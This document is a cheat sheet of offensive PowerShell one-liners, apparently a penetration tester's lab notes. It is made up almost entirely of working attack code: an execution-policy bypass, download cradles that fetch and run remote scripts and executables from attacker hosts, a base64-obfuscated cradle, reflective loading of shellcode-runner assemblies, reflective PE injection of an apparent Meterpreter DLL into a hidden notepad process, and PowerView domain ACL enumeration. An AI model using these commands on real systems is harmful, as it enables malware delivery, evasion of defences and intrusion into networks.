## Oneliners - ps1


### Powershell

Open powershell with bypass
#bypass #ps1
```cmd
powershell -exec bypass
```

#ps1 #runner #cradle
Download cradle in memory:
```powershell
(New-Object System.Net.WebClient).DownloadString("http://192.168.49.155/run.txt") | IEX
```

#ps1 #runner #cradle #dropper #exe
```powershell
powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.49.186/met64.exe', 'C:\Windows\Tasks\met64.exe'); C:\Windows\Tasks\met64.exe
```

#ps1 #encoding #cradle
Encode download cradle:
```powershell
$text = "<download cradle>"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
$EncodedText = [Convert]::ToBase64String($bytes)
$EncodedText
# then to execute use powershell -enc <encoded_text>
powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADEANQA1AC8AcgB1AG4ALgB0AHgAdAAiACkAIAB8ACAASQBFAFgA
```

#ps1 #encoding #hex #assembly
```powershell
$assemblyFile = "<path_to_assembly>"
$stringBuilder = New-Object -Type System.Text.StringBuilder
$stringBuilder.Append("0x")
$fileStream = [IO.File]::OpenRead($assemblyFile)
while (($byte = $fileStream.ReadByte()) -gt -1) {
	$stringBuilder.Append($byte.ToString("X2")) | Out-Null
}
$hexDll = $stringBuilder.ToString() -join ""
$hexDll | Out-File C:\Users\Administrator\Desktop\hex.txt
```

^6217c2
#ps1 #reflection #runner 
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.155/simple-runner.exe')
# If your class and method is public
$assem = [System.Reflection.Assembly]::Load($data)
[shellcode_runner_simple.Program]::Main("".Split())
```

#ps1 #reflection #runner #dll #managed #dll-managed
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.73/ClassRunner.dll')

[System.Reflection.Assembly]::Load($data).GetType("ClassRunner.Class1").GetMethod("runner").Invoke(0, $null)
```

#ps1 #injection #reflective-injection #remote-injection #runner #dll #unmanaged #dll-unmanaged #msfvenom
```powershell
Start-Process "C:\Windows\system32\notepad.exe" -WindowStyle Hidden
$bytes = (New-Object System.Net.WebClient).DownloadData("http://192.168.49.66/met.dll")
$procid = (Get-Process -Name notepad).Id[0]

IEX (New-Object System.Net.WebClient).DownloadString("http://192.168.49.66/Invoke-ReflectivePEInjection.ps1")

Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

#powerview #enum #dacl #resolve-sid ^d8fba8
```powershell
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```